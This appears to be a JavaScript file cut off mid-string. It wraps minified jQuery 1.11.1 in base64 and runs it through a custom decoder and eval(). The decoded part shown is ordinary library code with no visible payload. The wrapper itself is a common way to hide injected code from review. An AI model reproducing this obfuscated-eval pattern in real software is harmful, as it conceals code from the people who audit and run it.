function decodeBase(str){return decodeURIComponent(Array.prototype.map.call(atob(str), function(c){return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);}).join(''));}eval(decodeBase('DQohZnVuY3Rpb24gKGEsIGIpIHsgIm9iamVjdCIgPT0gdHlwZW9mIG1vZHVsZSAmJiAib2JqZWN0IiA9PSB0eXBlb2YgbW9kdWxlLmV4cG9ydHMgPyBtb2R1bGUuZXhwb3J0cyA9IGEuZG9jdW1lbnQgPyBiKGEsICEwKSA6IGZ1bmN0aW9uIChhKSB7IGlmICghYS5kb2N1bWVudCkgdGhyb3cgbmV3IEVycm9yKCJqUXVlcnkgcmVxdWlyZXMgYSB3aW5kb3cgd2l0aCBhIGRvY3VtZW50Iik7IHJldHVybiBiKGEpIH0gOiBiKGEpIH0oInVuZGVmaW5lZCIgIT0gdHlwZW9mIHdpbmRvdyA/IHdpbmRvdyA6IHRoaXMsIGZ1bmN0aW9uIChhLCBiKSB7DQogICAgdmFyIGMgPSBbXSwgZCA9IGMuc2xpY2UsIGUgPSBjLmNvbmNhdCwgZiA9IGMucHVzaCwgZyA9IGMuaW5kZXhPZiwgaCA9IHt9LCBpID0gaC50b1N0cmluZywgaiA9IGguaGFzT3duUHJvcGVydHksIGsgPSB7fSwgbCA9ICIxLjExLjEiLCBtID0gZnVuY3Rpb24gKGEsIGIpIHsgcmV0dXJuIG5ldyBtLmZuLmluaXQoYSwgYikgfSwgbiA9IC9eW1xzXHVGRUZGXHhBMF0rfFtcc1x1RkVGRlx4QTBdKyQvZywgbyA9IC9eLW1zLS8sIHAgPSAvLShbXGRhLXpdKS9naSwgcSA9IGZ1bmN0aW9uIChhLCBiKSB7IHJldHVybiBiLnRvVXBwZXJDYXNlKCkgfTsgbS5mbiA9IG0ucHJvdG90eXBlID0geyBqcXVlcnk6IGwsIGNvbnN0cnVjdG9yOiBtLCBzZWxlY3RvcjogIiIsIGxlbmd0aDogMCwgdG9BcnJheTogZnVuY3Rpb24gKCkgeyByZXR1cm4gZC5jYWxsKHRoaXMpIH0sIGdldDogZnVuY3Rpb24gKGEpIHsgcmV0dXJuIG51bGwgIT0gYSA/IDAgPiBhID8gdGhpc1thICsgdGhpcy5sZW5ndGhdIDogdGhpc1thXSA6IGQuY2FsbCh0aGlzKSB9LCBwdXNoU3RhY2s6IGZ1bmN0aW9uIChhKSB7IHZhciBiID0gbS5tZXJnZSh0aGlzLmNvbnN0cnVjdG9yKCksIGEpOyByZXR1cm4gYi5wcmV2T2JqZWN0ID0gdGhpcywgYi5jb250ZXh0ID0gdGhpcy5jb250ZXh0LCBiIH0sIGVhY2g6IGZ1bmN0aW9uIChhLCBiKSB7IHJldHVybiBtLmVhY2godGhpcywgYSwgYikgfSwgbWFwOiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gdGhpcy5wdXNoU3RhY2sobS5tYXAodGhpcywgZnVuY3Rpb24gKGIsIGMpIHsgcmV0dXJuIGEuY2FsbChiLCBjLCBiKSB9KSkgfSwgc2xpY2U6IGZ1bmN0aW9uICgpIHsgcmV0dXJuIHRoaXMucHVzaFN0YWNrKGQuYXBwbHkodGhpcywgYXJndW1lbnRzKSkgfSwgZmlyc3Q6IGZ1bmN0aW9uICgpIHsgcmV0dXJuIHRoaXMuZXEoMCkgfSwgbGFzdDogZnVuY3Rpb24gKCkgeyByZXR1cm4gdGhpcy5lcSgtMSkgfSwgZXE6IGZ1bmN0aW9uIChhKSB7IHZhciBiID0gdGhpcy5sZW5ndGgsIGMgPSArYSArICgwID4gYSA/IGIgOiAwKTsgcmV0dXJuIHRoaXMucHVzaFN0YWNrKGMgPj0gMCAmJiBiID4gYyA/IFt0aGlzW2NdXSA6IFtdKSB9LCBlbmQ6IGZ1bmN0aW9uICgpIHsgcmV0dXJuIHRoaXMucHJldk9iamVjdCB8fCB0aGlzLmNvbnN0cnVjdG9yKG51bGwpIH0sIHB1c2g6IGYsIHNvcnQ6IGMuc29ydCwgc3BsaWNlOiBjLnNwbGljZSB9LCBtLmV4dGVuZCA9IG0uZm4uZXh0ZW5kID0gZnVuY3Rpb24gKCkgeyB2YXIgYSwgYiwgYywgZCwgZSwgZiwgZyA9IGFyZ3VtZW50c1swXSB8fCB7fSwgaCA9IDEsIGkgPSBhcmd1bWVudHMubGVuZ3RoLCBqID0gITE7IGZvciAoImJvb2xlYW4iID09IHR5cGVvZiBnICYmIChqID0gZywgZyA9IGFyZ3VtZW50c1toXSB8fCB7fSwgaCsrKSwgIm9iamVjdCIgPT0gdHlwZW9mIGcgfHwgbS5pc0Z1bmN0aW9uKGcpIHx8IChnID0ge30pLCBoID09PSBpICYmIChnID0gdGhpcywgaC0tKSA7IGkgPiBoOyBoKyspIGlmIChudWxsICE9IChlID0gYXJndW1lbnRzW2hdKSkgZm9yIChkIGluIGUpIGEgPSBnW2RdLCBjID0gZVtkXSwgZyAhPT0gYyAmJiAoaiAmJiBjICYmIChtLmlzUGxhaW5PYmplY3QoYykgfHwgKGIgPSBtLmlzQXJyYXkoYykpKSA/IChiID8gKGIgPSAhMSwgZiA9IGEgJiYgbS5pc0FycmF5KGEpID8gYSA6IFtdKSA6IGYgPSBhICYmIG0uaXNQbGFpbk9iamVjdChhKSA/IGEgOiB7fSwgZ1tkXSA9IG0uZXh0ZW5kKGosIGYsIGMpKSA6IHZvaWQgMCAhPT0gYyAmJiAoZ1tkXSA9IGMpKTsgcmV0dXJuIGcgfSwgbS5leHRlbmQoeyBleHBhbmRvOiAialF1ZXJ5IiArIChsICsgTWF0aC5yYW5kb20oKSkucmVwbGFjZSgvXEQvZywgIiIpLCBpc1JlYWR5OiAhMCwgZXJyb3I6IGZ1bmN0aW9uIChhKSB7IHRocm93IG5ldyBFcnJvcihhKSB9LCBub29wOiBmdW5jdGlvbiAoKSB7IH0sIGlzRnVuY3Rpb246IGZ1bmN0aW9uIChhKSB7IHJldHVybiAiZnVuY3Rpb24iID09PSBtLnR5cGUoYSkgfSwgaXNBcnJheTogQXJyYXkuaXNBcnJheSB8fCBmdW5jdGlvbiAoYSkgeyByZXR1cm4gImFycmF5IiA9PT0gbS50eXBlKGEpIH0sIGlzV2luZG93OiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gbnVsbCAhPSBhICYmIGEgPT0gYS53aW5kb3cgfSwgaXNOdW1lcmljOiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gIW0uaXNBcnJheShhKSAmJiBhIC0gcGFyc2VGbG9hdChhKSA+PSAwIH0sIGlzRW1wdHlPYmplY3Q6IGZ1bmN0aW9uIChhKSB7IHZhciBiOyBmb3IgKGIgaW4gYSkgcmV0dXJuICExOyByZXR1cm4gITAgfSwgaXNQbGFpbk9iamVjdDogZnVuY3Rpb24gKGEpIHsgdmFyIGI7IGlmICghYSB8fCAib2JqZWN0IiAhPT0gbS50eXBlKGEpIHx8IGEubm9kZVR5cGUgfHwgbS5pc1dpbmRvdyhhKSkgcmV0dXJuICExOyB0cnkgeyBpZiAoYS5jb25zdHJ1Y3RvciAmJiAhai5jYWxsKGEsICJjb25zdHJ1Y3RvciIpICYmICFqLmNhbGwoYS5jb25zdHJ1Y3Rvci5wcm90b3R5cGUsICJpc1Byb3RvdHlwZU9mIikpIHJldHVybiAhMSB9IGNhdGNoIChjKSB7IHJldHVybiAhMSB9IGlmIChrLm93bkxhc3QpIGZvciAoYiBpbiBhKSByZXR1cm4gai5jYWxsKGEsIGIpOyBmb3IgKGIgaW4gYSk7IHJldHVybiB2b2lkIDAgPT09IGIgfHwgai5jYWxsKGEsIGIpIH0sIHR5cGU6IGZ1bmN0aW9uIChhKSB7IHJldHVybiBudWxsID09IGEgPyBhICsgIiIgOiAib2JqZWN0IiA9PSB0eXBlb2YgYSB8fCAiZnVuY3Rpb24iID09IHR5cGVvZiBhID8gaFtpLmNhbGwoYSldIHx8ICJvYmplY3QiIDogdHlwZW9mIGEgfSwgZ2xvYmFsRXZhbDogZnVuY3Rpb24gKGIpIHsgYiAmJiBtLnRyaW0oYikgJiYgKGEuZXhlY1NjcmlwdCB8fCBmdW5jdGlvbiAoYikgeyBhLmV2YWwuY2FsbChhLCBiKSB9KShiKSB9LCBjYW1lbENhc2U6IGZ1bmN0aW9uIChhKSB7IHJldHVybiBhLnJlcGxhY2UobywgIm1zLSIpLnJlcGxhY2UocCwgcSkgfSwgbm9kZU5hbWU6IGZ1bmN0aW9uIChhLCBiKSB7IHJldHVybiBhLm5vZGVOYW1lICYmIGEubm9kZU5hbWUudG9Mb3dlckNhc2UoKSA9PT0gYi50b0xvd2VyQ2FzZSgpIH0sIGVhY2g6IGZ1bmN0aW9uIChhLCBiLCBjKSB7IHZhciBkLCBlID0gMCwgZiA9IGEubGVuZ3RoLCBnID0gcihhKTsgaWYgKGMpIHsgaWYgKGcpIHsgZm9yICg7IGYgPiBlOyBlKyspIGlmIChkID0gYi5hcHBseShhW2VdLCBjKSwgZCA9PT0gITEpIGJyZWFrIH0gZWxzZSBmb3IgKGUgaW4gYSkgaWYgKGQgPSBiLmFwcGx5KGFbZV0sIGMpLCBkID09PSAhMSkgYnJlYWsgfSBlbHNlIGlmIChnKSB7IGZvciAoOyBmID4gZTsgZSsrKSBpZiAoZCA9IGIuY2FsbChhW2VdLCBlLCBhW2VdKSwgZCA9PT0gITEpIGJyZWFrIH0gZWxzZSBmb3IgKGUgaW4gYSkgaWYgKGQgPSBiLmNhbGwoYVtlXSwgZSwgYVtlXSksIGQgPT09ICExKSBicmVhazsgcmV0dXJuIGEgfSwgdHJpbTogZnVuY3Rpb24gKGEpIHsgcmV0dXJuIG51bGwgPT0gYSA/ICIiIDogKGEgKyAiIikucmVwbGFjZShuLCAiIikgfSwgbWFrZUFycmF5OiBmdW5jdGlvbiAoYSwgYikgeyB2YXIgYyA9IGIgfHwgW107IHJldHVybiBudWxsICE9IGEgJiYgKHIoT2JqZWN0KGEpKSA/IG0ubWVyZ2UoYywgInN0cmluZyIgPT0gdHlwZW9mIGEgPyBbYV0gOiBhKSA6IGYuY2FsbChjLCBhKSksIGMgfSwgaW5BcnJheTogZnVuY3Rpb24gKGEsIGIsIGMpIHsgdmFyIGQ7IGlmIChiKSB7IGlmIChnKSByZXR1cm4gZy5jYWxsKGIsIGEsIGMpOyBmb3IgKGQgPSBiLmxlbmd0aCwgYyA9IGMgPyAwID4gYyA/IE1hdGgubWF4KDAsIGQgKyBjKSA6IGMgOiAwOyBkID4gYzsgYysrKSBpZiAoYyBpbiBiICYmIGJbY10gPT09IGEpIHJldHVybiBjIH0gcmV0dXJuIC0xIH0sIG1lcmdlOiBmdW5jdGlvbiAoYSwgYikgeyB2YXIgYyA9ICtiLmxlbmd0aCwgZCA9IDAsIGUgPSBhLmxlbmd0aDsgd2hpbGUgKGMgPiBkKSBhW2UrK10gPSBiW2QrK107IGlmIChjICE9PSBjKSB3aGlsZSAodm9pZCAwICE9PSBiW2RdKSBhW2UrK10gPSBiW2QrK107IHJldHVybiBhLmxlbmd0aCA9IGUsIGEgfSwgZ3JlcDogZnVuY3Rpb24gKGEsIGIsIGMpIHsgZm9yICh2YXIgZCwgZSA9IFtdLCBmID0gMCwgZyA9IGEubGVuZ3RoLCBoID0gIWM7IGcgPiBmOyBmKyspIGQgPSAhYihhW2ZdLCBmKSwgZCAhPT0gaCAmJiBlLnB1c2goYVtmXSk7IHJldHVybiBlIH0sIG1hcDogZnVuY3Rpb24gKGEsIGIsIGMpIHsgdmFyIGQsIGYgPSAwLCBnID0gYS5sZW5ndGgsIGggPSByKGEpLCBpID0gW107IGlmIChoKSBmb3IgKDsgZyA+IGY7IGYrKykgZCA9IGIoYVtmXSwgZiwgYyksIG51bGwgIT0gZCAmJiBpLnB1c2goZCk7IGVsc2UgZm9yIChmIGluIGEpIGQgPSBiKGFbZl0sIGYsIGMpLCBudWxsICE9IGQgJiYgaS5wdXNoKGQpOyByZXR1cm4gZS5hcHBseShbXSwgaSkgfSwgZ3VpZDogMSwgcHJveHk6IGZ1bmN0aW9uIChhLCBiKSB7IHZhciBjLCBlLCBmOyByZXR1cm4gInN0cmluZyIgPT0gdHlwZW9mIGIgJiYgKGYgPSBhW2JdLCBiID0gYSwgYSA9IGYpLCBtLmlzRnVuY3Rpb24oYSkgPyAoYyA9IGQuY2FsbChhcmd1bWVudHMsIDIpLCBlID0gZnVuY3Rpb24gKCkgeyByZXR1cm4gYS5hcHBseShiIHx8IHRoaXMsIGMuY29uY2F0KGQuY2FsbChhcmd1bWVudHMpKSkgfSwgZS5ndWlkID0gYS5ndWlkID0gYS5ndWlkIHx8IG0uZ3VpZCsrLCBlKSA6IHZvaWQgMCB9LCBub3c6IGZ1bmN0aW9uICgpIHsgcmV0dXJuICtuZXcgRGF0ZSB9LCBzdXBwb3J0OiBrIH0pLCBtLmVhY2goIkJvb2xlYW4gTnVtYmVyIFN0cmluZyBGdW5jdGlvbiBBcnJheSBEYXRlIFJlZ0V4cCBPYmplY3QgRXJyb3IiLnNwbGl0KCIgIiksIGZ1bmN0aW9uIChhLCBiKSB7IGhbIltvYmplY3QgIiArIGIgKyAiXSJdID0gYi50b0xvd2VyQ2FzZSgpIH0pOyBmdW5jdGlvbiByKGEpIHsgdmFyIGIgPSBhLmxlbmd0aCwgYyA9IG0udHlwZShhKTsgcmV0dXJuICJmdW5jdGlvbiIgPT09IGMgfHwgbS5pc1dpbmRvdyhhKSA/ICExIDogMSA9PT0gYS5ub2RlVHlwZSAmJiBiID8gITAgOiAiYXJyYXkiID09PSBjIHx8IDAgPT09IGIgfHwgIm51bWJlciIgPT0gdHlwZW9mIGIgJiYgYiA+IDAgJiYgYiAtIDEgaW4gYSB9IHZhciBzID0gZnVuY3Rpb24gKGEpIHsgdmFyIGIsIGMsIGQsIGUsIGYsIGcsIGgsIGksIGosIGssIGwsIG0sIG4sIG8sIHAsIHEsIHIsIHMsIHQsIHUgPSAic2l6emxlIiArIC1uZXcgRGF0ZSwgdiA9IGEuZG9jdW1lbnQsIHcgPSAwLCB4ID0gMCwgeSA9IGdiKCksIHogPSBnYigpLCBBID0gZ2IoKSwgQiA9IGZ1bmN0aW9uIChhLCBiKSB7IHJldHVybiBhID09PSBiICYmIChsID0gITApLCAwIH0sIEMgPSAidW5kZWZpbmVkIiwgRCA9IDEgPDwgMzEsIEUgPSB7fS5oYXNPd25Qcm9wZXJ0eSwgRiA9IFtdLCBHID0gRi5wb3AsIEggPSBGLnB1c2gsIEkgPSBGLnB1c2gsIEogPSBGLnNsaWNlLCBLID0gRi5pbmRleE9mIHx8IGZ1bmN0aW9uIChhKSB7IGZvciAodmFyIGIgPSAwLCBjID0gdGhpcy5sZW5ndGg7IGMgPiBiOyBiKyspIGlmICh0aGlzW2JdID09PSBhKSByZXR1cm4gYjsgcmV0dXJuIC0xIH0sIEwgPSAiY2hlY2tlZHxzZWxlY3RlZHxhc3luY3xhdXRvZm9jdXN8YXV0b3BsYXl8Y29udHJvbHN8ZGVmZXJ8ZGlzYWJsZWR8aGlkZGVufGlzbWFwfGxvb3B8bXVsdGlwbGV8b3BlbnxyZWFkb25seXxyZXF1aXJlZHxzY29wZWQiLCBNID0gIltcXHgyMFxcdFxcclxcblxcZl0iLCBOID0gIig/OlxcXFwufFtcXHctXXxbXlxceDAwLVxceGEwXSkrIiwgTyA9IE4ucmVwbGFjZSgidyIsICJ3IyIpLCBQID0gIlxcWyIgKyBNICsgIiooIiArIE4gKyAiKSg/OiIgKyBNICsgIiooWypeJHwhfl0/PSkiICsgTSArICIqKD86JygoPzpcXFxcLnxbXlxcXFwnXSkqKSd8XCIoKD86XFxcXC58W15cXFxcXCJdKSopXCJ8KCIgKyBPICsgIikpfCkiICsgTSArICIqXFxdIiwgUSA9ICI6KCIgKyBOICsgIikoPzpcXCgoKCcoKD86XFxcXC58W15cXFxcJ10pKiknfFwiKCg/OlxcXFwufFteXFxcXFwiXSkqKVwiKXwoKD86XFxcXC58W15cXFxcKClbXFxdXXwiICsgUCArICIpKil8LiopXFwpfCkiLCBSID0gbmV3IFJlZ0V4cCgiXiIgKyBNICsgIit8KCg/Ol58W15cXFxcXSkoPzpcXFxcLikqKSIgKyBNICsgIiskIiwgImciKSwgUyA9IG5ldyBSZWdFeHAoIl4iICsgTSArICIqLCIgKyBNICsgIioiKSwgVCA9IG5ldyBSZWdFeHAoIl4iICsgTSArICIqKFs+K35dfCIgKyBNICsgIikiICsgTSArICIqIiksIFUgPSBuZXcgUmVnRXhwKCI9IiArIE0gKyAiKihbXlxcXSdcIl0qPykiICsgTSArICIqXFxdIiwgImciKSwgViA9IG5ldyBSZWdFeHAoUSksIFcgPSBuZXcgUmVnRXhwKCJeIiArIE8gKyAiJCIpLCBYID0geyBJRDogbmV3IFJlZ0V4cCgiXiMoIiArIE4gKyAiKSIpLCBDTEFTUzogbmV3IFJlZ0V4cCgiXlxcLigiICsgTiArICIpIiksIFRBRzogbmV3IFJlZ0V4cCgiXigiICsgTi5yZXBsYWNlKCJ3IiwgIncqIikgKyAiKSIpLCBBVFRSOiBuZXcgUmVnRXhwKCJeIiArIFApLCBQU0VVRE86IG5ldyBSZWdFeHAoIl4iICsgUSksIENISUxEOiBuZXcgUmVnRXhwKCJeOihvbmx5fGZpcnN0fGxhc3R8bnRofG50aC1sYXN0KS0oY2hpbGR8b2YtdHlwZSkoPzpcXCgiICsgTSArICIqKGV2ZW58b2RkfCgoWystXXwpKFxcZCopbnwpIiArIE0gKyAiKig/OihbKy1dfCkiICsgTSArICIqKFxcZCspfCkpIiArIE0gKyAiKlxcKXwpIiwgImkiKSwgYm9vbDogbmV3IFJlZ0V4cCgiXig/OiIgKyBMICsgIikkIiwgImkiKSwgbmVlZHNDb250ZXh0OiBuZXcgUmVnRXhwKCJeIiArIE0gKyAiKls+K35dfDooZXZlbnxvZGR8ZXF8Z3R8bHR8bnRofGZpcnN0fGxhc3QpKD86XFwoIiArIE0gKyAiKigoPzotXFxkKT9cXGQqKSIgKyBNICsgIipcXCl8KSg/PVteLV18JCkiLCAiaSIpIH0sIFkgPSAvXig/OmlucHV0fHNlbGVjdHx0ZXh0YXJlYXxidXR0b24pJC9pLCBaID0gL15oXGQkL2ksICQgPSAvXltee10rXHtccypcW25hdGl2ZSBcdy8sIF8gPSAvXig/OiMoW1x3LV0rKXwoXHcrKXxcLihbXHctXSspKSQvLCBhYiA9IC9bK35dLywgYmIgPSAvJ3xcXC9nLCBjYiA9IG5ldyBSZWdFeHAoIlxcXFwoW1xcZGEtZl17MSw2fSIgKyBNICsgIj98KCIgKyBNICsgIil8LikiLCAiaWciKSwgZGIgPSBmdW5jdGlvbiAoYSwgYiwgYykgeyB2YXIgZCA9ICIweCIgKyBiIC0gNjU1MzY7IHJldHVybiBkICE9PSBkIHx8IGMgPyBiIDogMCA+IGQgPyBTdHJpbmcuZnJvbUNoYXJDb2RlKGQgKyA2NTUzNikgOiBTdHJpbmcuZnJvbUNoYXJDb2RlKGQgPj4gMTAgfCA1NTI5NiwgMTAyMyAmIGQgfCA1NjMyMCkgfTsgdHJ5IHsgSS5hcHBseShGID0gSi5jYWxsKHYuY2hpbGROb2RlcyksIHYuY2hpbGROb2RlcyksIEZbdi5jaGlsZE5vZGVzLmxlbmd0aF0ubm9kZVR5cGUgfSBjYXRjaCAoZWIpIHsgSSA9IHsgYXBwbHk6IEYubGVuZ3RoID8gZnVuY3Rpb24gKGEsIGIpIHsgSC5hcHBseShhLCBKLmNhbGwoYikpIH0gOiBmdW5jdGlvbiAoYSwgYikgeyB2YXIgYyA9IGEubGVuZ3RoLCBkID0gMDsgd2hpbGUgKGFbYysrXSA9IGJbZCsrXSk7IGEubGVuZ3RoID0gYyAtIDEgfSB9IH0gZnVuY3Rpb24gZmIoYSwgYiwgZCwgZSkgeyB2YXIgZiwgaCwgaiwgaywgbCwgbywgciwgcywgdywgeDsgaWYgKChiID8gYi5vd25lckRvY3VtZW50IHx8IGIgOiB2KSAhPT0gbiAmJiBtKGIpLCBiID0gYiB8fCBuLCBkID0gZCB8fCBbXSwgIWEgfHwgInN0cmluZyIgIT0gdHlwZW9mIGEpIHJldHVybiBkOyBpZiAoMSAhPT0gKGsgPSBiLm5vZGVUeXBlKSAmJiA5ICE9PSBrKSByZXR1cm4gW107IGlmIChwICYmICFlKSB7IGlmIChmID0gXy5leGVjKGEpKSBpZiAoaiA9IGZbMV0pIHsgaWYgKDkgPT09IGspIHsgaWYgKGggPSBiLmdldEVsZW1lbnRCeUlkKGopLCAhaCB8fCAhaC5wYXJlbnROb2RlKSByZXR1cm4gZDsgaWYgKGguaWQgPT09IGopIHJldHVybiBkLnB1c2goaCksIGQgfSBlbHNlIGlmIChiLm93bmVyRG9jdW1lbnQgJiYgKGggPSBiLm93bmVyRG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaikpICYmIHQoYiwgaCkgJiYgaC5pZCA9PT0gaikgcmV0dXJuIGQucHVzaChoKSwgZCB9IGVsc2UgeyBpZiAoZlsyXSkgcmV0dXJuIEkuYXBwbHkoZCwgYi5nZXRFbGVtZW50c0J5VGFnTmFtZShhKSksIGQ7IGlmICgoaiA9IGZbM10pICYmIGMuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSAmJiBiLmdldEVsZW1lbnRzQnlDbGFzc05hbWUpIHJldHVybiBJLmFwcGx5KGQsIGIuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZShqKSksIGQgfSBpZiAoYy5xc2EgJiYgKCFxIHx8ICFxLnRlc3QoYSkpKSB7IGlmIChzID0gciA9IHUsIHcgPSBiLCB4ID0gOSA9PT0gayAmJiBhLCAxID09PSBrICYmICJvYmplY3QiICE9PSBiLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkpIHsgbyA9IGcoYSksIChyID0gYi5nZXRBdHRyaWJ1dGUoImlkIikpID8gcyA9IHIucmVwbGFjZShiYiwgIlxcJCYiKSA6IGIuc2V0QXR0cmlidXRlKCJpZCIsIHMpLCBzID0gIltpZD0nIiArIHMgKyAiJ10gIiwgbCA9IG8ubGVuZ3RoOyB3aGlsZSAobC0tKSBvW2xdID0gcyArIHFiKG9bbF0pOyB3ID0gYWIudGVzdChhKSAmJiBvYihiLnBhcmVudE5vZGUpIHx8IGIsIHggPSBvLmpvaW4oIiwiKSB9IGlmICh4KSB0cnkgeyByZXR1cm4gSS5hcHBseShkLCB3LnF1ZXJ5U2VsZWN0b3JBbGwoeCkpLCBkIH0gY2F0Y2ggKHkpIHsgfSBmaW5hbGx5IHsgciB8fCBiLnJlbW92ZUF0dHJpYnV0ZSgiaWQiKSB9IH0gfSByZXR1cm4gaShhLnJlcGxhY2UoUiwgIiQxIiksIGIsIGQsIGUpIH0gZnVuY3Rpb24gZ2IoKSB7IHZhciBhID0gW107IGZ1bmN0aW9uIGIoYywgZSkgeyByZXR1cm4gYS5wdXNoKGMgKyAiICIpID4gZC5jYWNoZUxlbmd0aCAmJiBkZWxldGUgYlthLnNoaWZ0KCldLCBiW2MgKyAiICJdID0gZSB9IHJldHVybiBiIH0gZnVuY3Rpb24gaGIoYSkgeyByZXR1cm4gYVt1XSA9ICEwLCBhIH0gZnVuY3Rpb24gaWIoYSkgeyB2YXIgYiA9IG4uY3JlYXRlRWxlbWVudCgiZGl2Iik7IHRyeSB7IHJldHVybiAhIWEoYikgfSBjYXRjaCAoYykgeyByZXR1cm4gITEgfSBmaW5hbGx5IHsgYi5wYXJlbnROb2RlICYmIGIucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChiKSwgYiA9IG51bGwgfSB9IGZ1bmN0aW9uIGpiKGEsIGIpIHsgdmFyIGMgPSBhLnNwbGl0KCJ8IiksIGUgPSBhLmxlbmd0aDsgd2hpbGUgKGUtLSkgZC5hdHRySGFuZGxlW2NbZV1dID0gYiB9IGZ1bmN0aW9uIGtiKGEsIGIpIHsgdmFyIGMgPSBiICYmIGEsIGQgPSBjICYmIDEgPT09IGEubm9kZVR5cGUgJiYgMSA9PT0gYi5ub2RlVHlwZSAmJiAofmIuc291cmNlSW5kZXggfHwgRCkgLSAofmEuc291cmNlSW5kZXggfHwgRCk7IGlmIChkKSByZXR1cm4gZDsgaWYgKGMpIHdoaWxlIChjID0gYy5uZXh0U2libGluZykgaWYgKGMgPT09IGIpIHJldHVybiAtMTsgcmV0dXJuIGEgPyAxIDogLTEgfSBmdW5jdGlvbiBsYihhKSB7IHJldHVybiBmdW5jdGlvbiAoYikgeyB2YXIgYyA9IGIubm9kZU5hbWUudG9Mb3dlckNhc2UoKTsgcmV0dXJuICJpbnB1dCIgPT09IGMgJiYgYi50eXBlID09PSBhIH0gfSBmdW5jdGlvbiBtYihhKSB7IHJldHVybiBmdW5jdGlvbiAoYikgeyB2YXIgYyA9IGIubm9kZU5hbWUudG9Mb3dlckNhc2UoKTsgcmV0dXJuICgiaW5wdXQiID09PSBjIHx8ICJidXR0b24iID09PSBjKSAmJiBiLnR5cGUgPT09IGEgfSB9IGZ1bmN0aW9uIG5iKGEpIHsgcmV0dXJuIGhiKGZ1bmN0aW9uIChiKSB7IHJldHVybiBiID0gK2IsIGhiKGZ1bmN0aW9uIChjLCBkKSB7IHZhciBlLCBmID0gYShbXSwgYy5sZW5ndGgsIGIpLCBnID0gZi5sZW5ndGg7IHdoaWxlIChnLS0pIGNbZSA9IGZbZ11dICYmIChjW2VdID0gIShkW2VdID0gY1tlXSkpIH0pIH0pIH0gZnVuY3Rpb24gb2IoYSkgeyByZXR1cm4gYSAmJiB0eXBlb2YgYS5nZXRFbGVtZW50c0J5VGFnTmFtZSAhPT0gQyAmJiBhIH0gYyA9IGZiLnN1cHBvcnQgPSB7fSwgZiA9IGZiLmlzWE1MID0gZnVuY3Rpb24gKGEpIHsgdmFyIGIgPSBhICYmIChhLm93bmVyRG9jdW1lbnQgfHwgYSkuZG9jdW1lbnRFbGVtZW50OyByZXR1cm4gYiA/ICJIVE1MIiAhPT0gYi5ub2RlTmFtZSA6ICExIH0sIG0gPSBmYi5zZXREb2N1bWVudCA9IGZ1bmN0aW9uIChhKSB7IHZhciBiLCBlID0gYSA/IGEub3duZXJEb2N1bWVudCB8fCBhIDogdiwgZyA9IGUuZGVmYXVsdFZpZXc7IHJldHVybiBlICE9PSBuICYmIDkgPT09IGUubm9kZVR5cGUgJiYgZS5kb2N1bWVudEVsZW1lbnQgPyAobiA9IGUsIG8gPSBlLmRvY3VtZW50RWxlbWVudCwgcCA9ICFmKGUpLCBnICYmIGcgIT09IGcudG9wICYmIChnLmFkZEV2ZW50TGlzdGVuZXIgPyBnLmFkZEV2ZW50TGlzdGVuZXIoInVubG9hZCIsIGZ1bmN0aW9uICgpIHsgbSgpIH0sICExKSA6IGcuYXR0YWNoRXZlbnQgJiYgZy5hdHRhY2hFdmVudCgib251bmxvYWQiLCBmdW5jdGlvbiAoKSB7IG0oKSB9KSksIGMuYXR0cmlidXRlcyA9IGliKGZ1bmN0aW9uIChhKSB7IHJldHVybiBhLmNsYXNzTmFtZSA9ICJpIiwgIWEuZ2V0QXR0cmlidXRlKCJjbGFzc05hbWUiKSB9KSwgYy5nZXRFbGVtZW50c0J5VGFnTmFtZSA9IGliKGZ1bmN0aW9uIChhKSB7IHJldHVybiBhLmFwcGVuZENoaWxkKGUuY3JlYXRlQ29tbWVudCgiIikpLCAhYS5nZXRFbGVtZW50c0J5VGFnTmFtZSgiKiIpLmxlbmd0aCB9KSwgYy5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lID0gJC50ZXN0KGUuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSkgJiYgaWIoZnVuY3Rpb24gKGEpIHsgcmV0dXJuIGEuaW5uZXJIVE1MID0gIjxkaXYgY2xhc3M9J2EnPjwvZGl2PjxkaXYgY2xhc3M9J2EgaSc+PC9kaXY+IiwgYS5maXJzdENoaWxkLmNsYXNzTmFtZSA9ICJpIiwgMiA9PT0gYS5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKCJpIikubGVuZ3RoIH0pLCBjLmdldEJ5SWQgPSBpYihmdW5jdGlvbiAoYSkgeyByZXR1cm4gby5hcHBlbmRDaGlsZChhKS5pZCA9IHUsICFlLmdldEVsZW1lbnRzQnlOYW1lIHx8ICFlLmdldEVsZW1lbnRzQnlOYW1lKHUpLmxlbmd0aCB9KSwgYy5nZXRCeUlkID8gKGQuZmluZC5JRCA9IGZ1bmN0aW9uIChhLCBiKSB7IGlmICh0eXBlb2YgYi5nZXRFbGVtZW50QnlJZCAhPT0gQyAmJiBwKSB7IHZhciBjID0gYi5nZXRFbGVtZW50QnlJZChhKTsgcmV0dXJuIGMgJiYgYy5wYXJlbnROb2RlID8gW2NdIDogW10gfSB9LCBkLmZpbHRlci5JRCA9IGZ1bmN0aW9uIChhKSB7IHZhciBiID0gYS5yZXBsYWNlKGNiLCBkYik7IHJldHVybiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gYS5nZXRBdHRyaWJ1dGUoImlkIikgPT09IGIgfSB9KSA6IChkZWxldGUgZC5maW5kLklELCBkLmZpbHRlci5JRCA9IGZ1bmN0aW9uIChhKSB7IHZhciBiID0gYS5yZXBsYWNlKGNiLCBkYik7IHJldHVybiBmdW5jdGlvbiAoYSkgeyB2YXIgYyA9IHR5cGVvZiBhLmdldEF0dHJpYnV0ZU5vZGUgIT09IEMgJiYgYS5nZXRBdHRyaWJ1dGVOb2RlKCJpZCIpOyByZXR1cm4gYyAmJiBjLnZhbHVlID09PSBiIH0gfSksIGQuZmluZC5UQUcgPSBjLmdldEVsZW1lbnRzQnlUYWdOYW1lID8gZnVuY3Rpb24gKGEsIGIpIHsgcmV0dXJuIHR5cGVvZiBiLmdldEVsZW1lbnRzQnlUYWdOYW1lICE9PSBDID8gYi5nZXRFbGVtZW50c0J5VG